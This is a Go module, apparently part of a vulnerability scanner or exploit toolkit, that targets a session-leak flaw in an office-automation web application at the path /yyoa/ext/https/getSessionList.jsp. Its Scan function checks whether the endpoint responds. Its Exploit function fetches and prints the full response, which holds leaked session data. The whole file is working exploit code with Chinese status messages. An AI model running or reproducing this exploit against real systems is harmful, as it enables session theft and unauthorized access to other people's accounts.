package vulners

import (
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
)

type Sy05 struct {
}

func (s *Sy05) Scan(targetUrl string) {
	vulnerable, err := sy05scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[+]存在getSessionList泄露Session")
	} else {
		color.White("[-]不存在getSessionList泄露Session")
	}
}

func (*Sy05) Exploit(targetUrl string) {
	runResult, err := sy05runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.White(runResult)
	} else {
		color.White("[!]无返回结果.")
	}
}

func sy05scancore(targetUrl string) (bool, error) {
	scancorePayload := "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
	req, err := http.NewRequest("GET", targetUrl+scancorePayload, nil)
	if err != nil {
		return false, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		return true, nil
	} else {
		return false, nil
	}
}
func sy05runcore(targetUrl string) (string, error) {
	runcorePayload := "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
	req, err := http.NewRequest("GET", targetUrl+runcorePayload, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	respContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(respContent), nil
}
